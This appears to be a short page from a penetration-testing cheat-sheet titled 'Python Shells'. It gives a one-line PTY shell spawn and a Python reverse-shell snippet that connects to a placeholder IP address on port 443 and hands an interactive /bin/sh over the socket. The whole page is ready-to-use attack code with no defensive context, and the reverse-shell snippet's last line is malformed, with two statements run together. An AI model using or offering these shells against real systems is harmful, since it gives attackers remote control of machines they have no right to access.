Python Shells
=============

.. code-block:: shell

	python -c 'import pty; pty.spawn("/bin/sh")'

.. code-block:: shell

	import socket,subprocess,os
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("<IP Address>",443))
	os.dup2(s.fileno(),0); os.dup2(s.fileno(),1)
	os.dup2(s.fileno(),2)p=subprocess.call(["/bin/sh","-i"])